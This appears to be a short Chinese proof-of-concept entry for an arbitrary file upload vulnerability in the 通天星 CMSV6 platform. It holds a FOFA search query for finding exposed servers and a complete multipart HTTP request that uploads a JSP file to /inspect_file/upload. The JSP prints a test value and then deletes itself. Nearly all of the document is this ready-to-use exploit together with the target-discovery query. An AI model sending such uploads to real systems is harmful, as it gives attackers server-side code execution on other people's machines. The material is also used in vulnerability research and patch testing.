## 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞


## fofa
```
body="./open/webApi.html"||body="/808gps/"
```

## poc
```
POST /inspect_file/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
content-Length: 238
Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2

-----------------------------7db372eb000e2
Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
Content-Type: application/octet-stream

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-----------------------------7db372eb000e2--
```
